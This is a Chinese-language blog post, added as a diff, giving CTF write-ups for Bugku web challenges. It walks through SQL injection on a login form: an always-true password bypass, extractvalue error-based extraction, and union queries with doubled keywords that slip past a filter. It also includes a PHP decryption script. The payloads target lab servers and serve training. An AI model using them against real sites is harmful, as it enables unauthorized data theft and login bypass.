@@ -1,0 +1,1164 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta http-equiv="Content-Language" content="zh-cn">
+    <meta charset="utf-8">
+    
+    
+    
+    <title>Bugkuctf-Web(3) | Somnus&#39;s blog</title>
+    <meta name="viewport" content="width=device-width,minimum-scale=1.0,maximum-scale=1.0,user-scalable=no">
+    
+    <meta name="theme-color" content="#77AAFF">
+    
+    
+    <meta name="keywords" content="ctf">
+    
+    
+
+    
+
+    <!-- Baidu Push -->
+<script>
+	(function(){
+		var bp = document.createElement('script');
+		var curProtocol = window.location.protocol.split(':')[0];
+		if (curProtocol === 'https') {
+			bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+		}
+		else {
+			bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+		}
+		var s = document.getElementsByTagName("script")[0];
+		s.parentNode.insertBefore(bp, s);
+	})();
+
+	var _hmt = _hmt || [];
+</script>
+
+
+
+    
+    <meta name="description" content="Bugkuctf-Web">
+<meta name="keywords" content="ctf">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Bugkuctf-Web(3)">
+<meta property="og:url" content="https://Foxgrin.github.io/posts/63286/index.html">
+<meta property="og:site_name" content="Somnus&#39;s blog">
+<meta property="og:description" content="Bugkuctf-Web">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="https://foxgrin.github.io/img/Bugkuctf-Web/90.png">
+<meta property="og:image" content="https://foxgrin.github.io/img/Bugkuctf-Web/92.png">
+<meta property="og:image" content="https://foxgrin.github.io/img/Bugkuctf-Web/93.png">
+<meta property="og:image" content="https://foxgrin.github.io/img/Bugkuctf-Web/93.png">
+<meta property="og:image" content="https://foxgrin.github.io/img/Bugkuctf-Web/94.png">
+<meta property="og:image" content="https://foxgrin.github.io/img/Bugkuctf-Web/95.png">
+<meta property="og:image" content="https://foxgrin.github.io/img/Bugkuctf-Web/96.png">
+<meta property="og:image" content="https://foxgrin.github.io/img/Bugkuctf-Web/97.png">
+<meta property="og:image" content="https://foxgrin.github.io/img/Bugkuctf-Web/98.png">
+<meta property="og:image" content="https://foxgrin.github.io/img/Bugkuctf-Web/99.png">
+<meta property="og:image" content="https://foxgrin.github.io/img/Bugkuctf-Web/100.png">
+<meta property="og:image" content="https://foxgrin.github.io/img/Bugkuctf-Web/101.png">
+<meta property="og:image" content="https://foxgrin.github.io/img/Bugkuctf-Web/102.png">
+<meta property="og:image" content="https://foxgrin.github.io/img/Bugkuctf-Web/103.png">
+<meta property="og:image" content="https://foxgrin.github.io/img/Bugkuctf-Web/104.png">
+<meta property="og:image" content="https://foxgrin.github.io/img/Bugkuctf-Web/105.png">
+<meta property="og:image" content="https://foxgrin.github.io/img/Bugkuctf-Web/106.png">
+<meta property="og:image" content="https://foxgrin.github.io/img/Bugkuctf-Web/107.png">
+<meta property="og:image" content="https://foxgrin.github.io/img/Bugkuctf-Web/108.png">
+<meta property="og:image" content="https://foxgrin.github.io/img/Bugkuctf-Web/109.png">
+<meta property="og:image" content="https://foxgrin.github.io/img/Bugkuctf-Web/110.png">
+<meta property="og:image" content="https://foxgrin.github.io/img/Bugkuctf-Web/111.png">
+<meta property="og:image" content="https://foxgrin.github.io/img/Bugkuctf-Web/112.png">
+<meta property="og:image" content="https://foxgrin.github.io/img/Bugkuctf-Web/113.png">
+<meta property="og:image" content="https://foxgrin.github.io/img/Bugkuctf-Web/114.png">
+<meta property="og:image" content="https://foxgrin.github.io/img/Bugkuctf-Web/115.png">
+<meta property="og:image" content="https://foxgrin.github.io/img/Bugkuctf-Web/116.png">
+<meta property="og:image" content="https://foxgrin.github.io/img/Bugkuctf-Web/117.png">
+<meta property="og:image" content="https://foxgrin.github.io/img/Bugkuctf-Web/118.png">
+<meta property="og:image" content="https://foxgrin.github.io/img/Bugkuctf-Web/119.png">
+<meta property="og:image" content="https://foxgrin.github.io/img/Bugkuctf-Web/120.png">
+<meta property="og:image" content="https://foxgrin.github.io/img/Bugkuctf-Web/121.png">
+<meta property="og:image" content="https://foxgrin.github.io/img/Bugkuctf-Web/122.png">
+<meta property="og:image" content="https://foxgrin.github.io/img/Bugkuctf-Web/123.png">
+<meta property="og:image" content="https://foxgrin.github.io/img/Bugkuctf-Web/124.png">
+<meta property="og:image" content="https://foxgrin.github.io/img/Bugkuctf-Web/125.png">
+<meta property="og:image" content="https://foxgrin.github.io/img/Bugkuctf-Web/126.png">
+<meta property="og:image" content="https://foxgrin.github.io/img/Bugkuctf-Web/127.png">
+<meta property="og:image" content="https://foxgrin.github.io/img/Bugkuctf-Web/128.png">
+<meta property="og:image" content="https://foxgrin.github.io/img/Bugkuctf-Web/129.png">
+<meta property="og:image" content="https://foxgrin.github.io/img/Bugkuctf-Web/130.png">
+<meta property="og:image" content="https://foxgrin.github.io/img/Bugkuctf-Web/131.png">
+<meta property="og:image" content="https://foxgrin.github.io/img/Bugkuctf-Web/132.png">
+<meta property="og:image" content="https://foxgrin.github.io/img/Bugkuctf-Web/133.png">
+<meta property="og:image" content="https://foxgrin.github.io/img/Bugkuctf-Web/134.png">
+<meta property="og:image" content="https://foxgrin.github.io/img/Bugkuctf-Web/135.png">
+<meta property="og:image" content="https://foxgrin.github.io/img/Bugkuctf-Web/136.png">
+<meta property="og:image" content="https://foxgrin.github.io/img/Bugkuctf-Web/137.png">
+<meta property="og:image" content="https://foxgrin.github.io/img/Bugkuctf-Web/138.png">
+<meta property="og:updated_time" content="2018-08-11T05:43:28.693Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Bugkuctf-Web(3)">
+<meta name="twitter:description" content="Bugkuctf-Web">
+<meta name="twitter:image" content="https://foxgrin.github.io/img/Bugkuctf-Web/90.png">
+    
+        <link rel="alternate" type="application/atom+xml" title="Somnus&#39;s blog" href="/atom.xml">
+    
+    <link rel="shortcut icon" href="/img/favicon.ico">
+    <link id="style" rel="stylesheet" href="/css/style.css?v=3.0">
+    <script>window.lazyScripts=[]</script>
+
+    <!-- custom head -->
+    
+            
+</head>
+
+<body>
+    <div id="loading" class="active"></div>
+    <aside id="menu"  class="hide" >
+  <div class="inner flex-row-vertical">
+    <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menu-off">
+        <i class="icon icon-lg icon-close"></i>
+    </a>
+    <div class="brand-wrap" >
+      <div class="brand">
+        <a href="/" class="avatar waves-effect waves-circle waves-light">
+          <img src="/img/touxiang/1.jpg" alt="avatar">
+        </a>
+        <hgroup class="introduce">
+          <h5 class="nickname" id="name">Somnus</h5>
+          
+            <div id="yiyanmotto" class="motto">&nbsp;</div>
+          
+        </hgroup>
+      </div>
+    </div>
+    <div class="scroll-wrap flex-col">
+      <ul class="nav">
+        
+              <li class="waves-block waves-effect">
+                  <a href="/"  >
+                    <i class="icon icon-lg icon-home"></i>
+                    <span>主 页</span><i class="icon icon-lg icon-caret-left"></i>
+                  </a>
+              </li>
+            
+              <li class="waves-block waves-effect">
+                  <a href="/archives"  >
+                    <i class="icon icon-lg icon-archives"></i>
+                    <span>归 档</span><i class="icon icon-lg icon-caret-left"></i>
+                  </a>
+              </li>
+            
+              <li class="waves-block waves-effect">
+                  <a href="/categories"  >
+                    <i class="icon icon-lg icon-th-list"></i>
+                    <span>分 类</span><i class="icon icon-lg icon-caret-left"></i>
+                  </a>
+              </li>
+            
+              <li class="waves-block waves-effect">
+                  <a href="/tags"  >
+                    <i class="icon icon-lg icon-tags"></i>
+                    <span>标 签</span><i class="icon icon-lg icon-caret-left"></i>
+                  </a>
+              </li>
+            
+              <li class="waves-block waves-effect">
+                  <a href="/about"  >
+                    <i class="icon icon-lg icon-smile-o"></i>
+                    <span>关 于</span><i class="icon icon-lg icon-caret-left"></i>
+                  </a>
+              </li>
+            
+      <div class="nav2">
+          
+              <a class="nav2item" data-title="Email" href="mailto:823263808@qq.com" target="_parent"title="Email" >
+                <i class="icon icon-lg icon-envelope-o envelope-o"></i>
+              </a>
+          
+              <a class="nav2item" data-title="Github" href="https://github.com/Foxgrin" target="_blank"title="Github" >
+                <i class="icon icon-lg icon-github github"></i>
+              </a>
+          
+              <a class="nav2item" data-title="微博" href="https://weibo.com/u/6018528806" target="_blank"title="微博" >
+                <i class="icon icon-lg icon-weibo weibo"></i>
+              </a>
+          
+
+            </div>
+        
+      </ul>
+        
+    </div>
+  </div>
+ 
+</aside>
+
+
+    <main id="main">
+        <header class="top-header" id="header">
+    <div class="flex-row">
+        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light on" id="menu-toggle">
+          <i class="icon icon-lg icon-navicon"></i>
+        </a>
+        <div class="flex-col header-title ellipsis">Bugkuctf-Web(3)</div>
+        
+        <div class="search-wrap" id="search-wrap">
+            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="back">
+                <i class="icon icon-lg icon-chevron-left"></i>
+            </a>
+            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="Search">
+            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="search">
+                <i class="icon icon-lg icon-search"></i>
+            </a>
+        </div>
+        
+        <a href="../../atom.xml" target="_blank" class="header-icon waves-effect waves-circle waves-light" id="Rss">
+            <i class="icon icon-lg icon-rss"></i>
+        </a>
+    </div>
+</header>
+<header class="content-header post-header">
+    
+    
+    <div class="container fade-scale">
+        <div id="myheader">
+            <h1 class="title">
+                
+            </h1>
+            <h5 class="subtitle">
+                
+                
+            </h5>
+        </div>
+    </div>
+
+</header>
+
+
+<div class="container body-wrap">
+    
+    <aside class="post-widget">
+        <nav class="post-toc-wrap" id="post-toc">
+            <h4>TOC</h4>
+            <ol class="post-toc"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#这是一个神奇的登录框"><span class="post-toc-number">1.</span> <span class="post-toc-text">这是一个神奇的登录框</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#多次"><span class="post-toc-number">2.</span> <span class="post-toc-text">多次</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#PHP-encrypt-1-ISCCCTF"><span class="post-toc-number">3.</span> <span class="post-toc-text">PHP_encrypt_1(ISCCCTF)</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#文件包含2"><span class="post-toc-number">4.</span> <span class="post-toc-text">文件包含2</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#flag-php"><span class="post-toc-number">5.</span> <span class="post-toc-text">flag.php</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#报错注入"><span class="post-toc-number">6.</span> <span class="post-toc-text">报错注入</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#login3-SKCTF"><span class="post-toc-number">7.</span> <span class="post-toc-text">login3(SKCTF)</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#网站被黑"><span class="post-toc-number">8.</span> <span class="post-toc-text">网站被黑</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#Trim的日记本"><span class="post-toc-number">9.</span> <span class="post-toc-text">Trim的日记本</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#文件上传2"><span class="post-toc-number">10.</span> <span class="post-toc-text">文件上传2</span></a></li></ol>
+        </nav>
+    </aside>
+   
+<article id="post-Bugkuctf-Web(3)"
+  class="post-article article-type-post fade" itemprop="blogPost">
+
+    <div class="post-card">
+        <h1 class="post-card-title">Bugkuctf-Web(3)</h1>
+        <div class="post-meta">
+            <i class="icon icon-lg icon-calendar-o"></i>
+            发表于
+            <time class="post-time" title="2018-08-06 16:06:00" datetime="2018-08-06T08:06:00.000Z"  itemprop="datePublished">2018-08-06</time>
+
+            <br id="mybreak"/>
+            
+	<i class="icon icon-lg icon-folder-o"></i>
+	分类：<ul class="article-category-list"><li class="article-category-list-item"><a class="article-category-list-link" href="/categories/Bugkuctf-Web/">Bugkuctf-Web</a></li></ul>
+
+
+            <i>·</i>
+            
+<span id="busuanzi_container_page_pv" title="文章总阅读量" style='display:none'>
+    <i class="icon icon-eye icon-pr"></i><span id="busuanzi_value_page_pv"></span>次浏览
+</span>
+
+
+        </div>
+        <div class="post-count-custom">
+            <i class="icon icon-lg icon-comment-o"></i>
+            阅读本文可能花费您&nbsp;<span class="post-count">21</span>&nbsp;分钟
+        </div>
+        <div class="post-content" id="post-content" itemprop="postContent">
+            <p>Bugkuctf中的Web题解(三)<a id="more"></a></p>
+<h3 id="这是一个神奇的登录框"><a href="#这是一个神奇的登录框" class="headerlink" title="这是一个神奇的登录框"></a>这是一个神奇的登录框</h3><p>网址：<a href="http://120.24.86.145:9001/sql/" target="_blank" rel="noopener">http://120.24.86.145:9001/sql/</a></p>
+<p>看到登录框，网址又有sql，八成就是sql注入</p>
+<p>试一下用户名输入admin’，没有报错，再试试admin”</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/img/Bugkuctf-Web/90.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/img/Bugkuctf-Web/92.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+<p>发现报错了，果然存在sql注入，从报错信息就看出来用户名和密码都被双引号包裹</p>
+<p>那么我们就可以用万能密码登录了</p>
+<p>payloads:admin_name=admin&amp;admin_passwd=1” or “1”=”1&amp;submit=GO+GO+GO</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/img/Bugkuctf-Web/93.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+<p>应该是登录成功了，但是要我们换一个身份登录才能拿到flag</p>
+<p>换个payloads:admin_name=AdMiNhEhE&amp;admin_passwd=1” or “1”=”1&amp;submit=GO+GO+GO</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/img/Bugkuctf-Web/93.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+<p>结果还是一样的，看来是只返回了用户名的信息，那干脆就直接利用报错注入注出信息试试</p>
+<p>先爆库</p>
+<p>payloads:admin_name=admin” and extractvalue(1,concat(0x3a,database(),0x3a))#&amp;admin_passwd=&amp;submit=GO+GO+GO</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/img/Bugkuctf-Web/94.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+<p>库名bugkusql1</p>
+<p>爆表</p>
+<p>payloads:admin_name=admin” and extractvalue(1,concat(0x3a,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x3a))#&amp;admin_passwd=&amp;submit=GO+GO+GO</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/img/Bugkuctf-Web/95.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+<p>表名为flag1,whoami</p>
+<p>爆flag1表下的列名</p>
+<p>payloads:admin_name=admin” and extractvalue(1,concat(0x3a,(select group_concat(column_name) from information_schema.columns where table_name=’flag1’),0x3a))#&amp;admin_passwd=&amp;submit=GO+GO+GO</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/img/Bugkuctf-Web/96.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+<p>列名为flag1</p>
+<p>最后爆flag1列下的数据</p>
+<p>payloads:admin_name=admin” and extractvalue(1,concat(0x3a,(select group_concat(flag1) from flag1),0x3a))#&amp;admin_passwd=&amp;submit=GO+GO+GO</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/img/Bugkuctf-Web/97.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+<p>试一下这个是不是flag，发现错误，仔细看才发现flag太长了报错信息没显示全…</p>
+<p>那再试试爆whoami表吧，看看能不能爆出密码</p>
+<p>先爆whoami表下的列名：</p>
+<p>payloads:admin_name=admin” and extractvalue(1,concat(0x3a,(select group_concat(column_name) from information_schema.columns where table_name=’whoami’),0x3a))#&amp;admin_passwd=&amp;submit=GO+GO+GO</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/img/Bugkuctf-Web/98.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+<p>列名为w_id,w_name,w_passwd</p>
+<p>爆passwd</p>
+<p>payloads:admin_name=admin” and extractvalue(1,concat(0x3a,(select w_passwd from whoami where w_name=’AdMiNhEhE’),0x3a))#&amp;admin_passwd=&amp;submit=GO+GO+GO</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/img/Bugkuctf-Web/99.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+<p>发现又太长了…</p>
+<p>仔细一想，用万能密码登录时也是有返回信息的，为什么不用联合注入呢…</p>
+<p>查询列数为2</p>
+<p>payloads:admin_name=0” union select flag1,2 from flag1 #&amp;admin_passwd=&amp;submit=GO+GO+GO</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/img/Bugkuctf-Web/100.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+<p>输入flag{ed6b28e684817d9efcaf802979e57aea}，成功</p>
+<h3 id="多次"><a href="#多次" class="headerlink" title="多次"></a>多次</h3><p>网址：<a href="http://120.24.86.145:9004/" target="_blank" rel="noopener">http://120.24.86.145:9004/</a></p>
+<p>一进去页面发现url：<a href="http://120.24.86.145:9004/1ndex.php?id=1" target="_blank" rel="noopener">http://120.24.86.145:9004/1ndex.php?id=1</a></p>
+<p>就尝试修改id值，id=1,2,3,4,5到5的时候提示</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/img/Bugkuctf-Web/101.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+<p>存在sql注入漏洞，猜测是数字型注入，注入点是id</p>
+<p>那试一下id=1’，显示error</p>
+<p>猜测可能id被单引号包裹，输入id=1’%23，正确显示信息，那么接下来注出查询列数</p>
+<p>输入id=1’ order by 3%23，显示error，将3改为2，又eroor，改为1，还是error，慌了…估计是把order 或者by给过滤了</p>
+<p>试一下输入id=1’ ^ (length(‘order’)!=0)%23，显示error，说明不是order被过滤</p>
+<p>再试一下输入id=1’ ^ (length(‘or’)!=0)%23</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/img/Bugkuctf-Web/102.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+<p>发现正确显示信息，说明or被过滤掉了，类似再尝试一下关键词and,select,union，发现都被过滤了</p>
+<p>尝试一下双写可不可以绕过，输入id=1’ oorrder by 2%23</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/img/Bugkuctf-Web/103.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+<p>正确显示信息，说明可能是用函数str_replace进行过滤，那么双写即可绕过</p>
+<p>输入id=1’ oorrder by 3%23，显示error，说明查询列数为2</p>
+<p>接下来就是熟悉爆库</p>
+<p>输入id=0’ uunionnion sselectelect 1,database()%23</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/img/Bugkuctf-Web/104.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+<p>数据库名：web1002-1</p>
+<p>爆表名</p>
+<p>输入id=0’ uunionnion sselectelect 1,group_concat(table_name) from infoorrmation_schema.tables where table_schema=database()%23 </p>
+<p><img src="/img/Bugkuctf-Web/105.png" alt=""></p>
+<p>表名：flag1,hint </p>
+<p>爆列名</p>
+<p>输入id=0’ uunionnion sselectelect 1,group_concat(column_name) from infoorrmation_schema.columns where table_name=’flag1’%23 </p>
+<p><img src="/img/Bugkuctf-Web/106.png" alt=""></p>
+<p>列名：flag1,address </p>
+<p>爆flag列下的数据</p>
+<p>输入id=0’ uunionnion sselectelect 1,flag1 from flag1%23</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/img/Bugkuctf-Web/107.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+<p>提交flag{usOwycTju+FTUUzXosjr}发现错误，突然发现提交的地方提示我们flag有两个</p>
+<p>就试着注出address列下的数据</p>
+<p>输入id=0’ uunionnion sselectelect 1,address from flag1%23</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/img/Bugkuctf-Web/108.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+<p>好像发现了新大陆</p>
+<p>点击访问下一关</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/img/Bugkuctf-Web/109.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+<p>页面的url提示oncemore，并且get参数又是id，猜测还是sql注入</p>
+<p>输入id=1’</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/img/Bugkuctf-Web/110.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+<p>恩？好像隐约看到了报错信息，不过被背景挡住了，没事，看一下源代码</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/img/Bugkuctf-Web/111.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+<p>惊喜发现有报错信息，同时也看出来id被单引号包裹，接着试着注出查询列数</p>
+<p>输入id=1’ order by 2%23，正常显示信息，输入id=1’ order by 3%23，报错。所以查询列数为2</p>
+<p>接下来注库名</p>
+<p>输入id=0’ union select 1,database()%23</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/img/Bugkuctf-Web/112.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+<p>发现union被过滤了，试着双写，没办法绕过</p>
+<p>于是尝试extractvalue报错注入</p>
+<p>输入id=1’ and extractvalue(1,concat(0x3a,database(),0x3a))%23</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/img/Bugkuctf-Web/113.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+<p>成功注入库名：web1002-2 </p>
+<p>输入id=1’ and extractvalue(1,concat(0x3a,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x3a))%23</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/img/Bugkuctf-Web/114.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+<p>表名：class,flag2 </p>
+<p>输入id=1’ and extractvalue(1,concat(0x3a,(select group_concat(column_name) from information_schema.columns where table_name=’flag2’),0x3a))%23</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/img/Bugkuctf-Web/115.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+<p>flag2表下列名：flag2,address </p>
+<p>输入id=1’ and extractvalue(1,concat(0x3a,(select flag2 from flag2),0x3a))%23</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/img/Bugkuctf-Web/116.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+<p>注出flag：flag{Bugku-sql_6s-2i-4t-bug} </p>
+<p>将B改成小写b，提交成功</p>
+<h3 id="PHP-encrypt-1-ISCCCTF"><a href="#PHP-encrypt-1-ISCCCTF" class="headerlink" title="PHP_encrypt_1(ISCCCTF)"></a>PHP_encrypt_1(ISCCCTF)</h3><p>这题直接给了一个php源文件</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">encrypt</span><span class="params">($data,$key)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $key = md5(<span class="string">'ISCC'</span>);</span><br><span class="line">    $x = <span class="number">0</span>;</span><br><span class="line">    $len = strlen($data);</span><br><span class="line">    $klen = strlen($key);</span><br><span class="line">    <span class="keyword">for</span> ($i=<span class="number">0</span>; $i &lt; $len; $i++) &#123; </span><br><span class="line">        <span class="keyword">if</span> ($x == $klen)</span><br><span class="line">        &#123;</span><br><span class="line">            $x = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        $char .= $key[$x];</span><br><span class="line">        $x+=<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> ($i=<span class="number">0</span>; $i &lt; $len; $i++) &#123;</span><br><span class="line">        $str .= chr((ord($data[$i]) + ord($char[$i])) % <span class="number">128</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> base64_encode($str);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">output: fR4aHWwuFCYYVydFRxMqHhhCKBseH1dbFygrRxIWJ1UYFhotFjA=</span><br></pre></td></tr></table></figure>
+<p>(PS:可能题目文件出了问题，output没有写在源文件中)</p>
+<p>审计后发现是一个加密的过程，给了最后的输出，需要我们自己编写解密的过程，根据加密的过程一步步解密，decrypt代码如下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">decrypt</span><span class="params">($str)</span></span>&#123;</span><br><span class="line">	$str = base64_decode($str); <span class="comment">// 将encrypt最后的base64加密后的结果进行base64解密</span></span><br><span class="line">	$key = md5(<span class="string">'ISCC'</span>); <span class="comment">// 对应encrypt的$key</span></span><br><span class="line">	$x = <span class="number">0</span>; <span class="comment">// 对应encrypt的$x</span></span><br><span class="line">	$len = strlen($str); <span class="comment">// $最后encrypt得到的$str长度跟原本encrypt传入的$data长度是一致的</span></span><br><span class="line">	$klen = strlen($key); <span class="comment">// 对应encrypt的$klen</span></span><br><span class="line">	$char = <span class="string">''</span>; <span class="comment">// 对应encrypt的$char</span></span><br><span class="line">	$data = <span class="string">''</span>; <span class="comment">// 对应encrypt的$data</span></span><br><span class="line">	<span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; $len; $i++)&#123; <span class="comment">//对应encrypt的$char赋值过程</span></span><br><span class="line">		<span class="keyword">if</span>($x == $klen)&#123;</span><br><span class="line">			$x = <span class="number">0</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		$char .= $key[$x];</span><br><span class="line">		$x += <span class="number">1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; $len; $i++)&#123; <span class="comment">// 获得$data</span></span><br><span class="line">		<span class="keyword">if</span>(ord($str[$i]) &lt; ord($char[$i]))&#123; <span class="comment">// 如果$str的某位的ascii值小于$char的某位的ascii值 </span></span><br><span class="line">			$data .= chr((ord($str[$i]) + <span class="number">128</span>) - ord($char[$i])); <span class="comment">// 说明encrypt有求余128</span></span><br><span class="line">		&#125; </span><br><span class="line">		<span class="keyword">else</span>&#123;</span><br><span class="line">			$data .= chr(ord($str[$i]) - ord($char[$i]));</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> $data;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$str = <span class="string">"fR4aHWwuFCYYVydFRxMqHhhCKBseH1dbFygrRxIWJ1UYFhotFjA="</span>;</span><br><span class="line">$data = decrypt($str);</span><br><span class="line"><span class="keyword">echo</span> $data;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>最后获得flag</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/img/Bugkuctf-Web/117.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
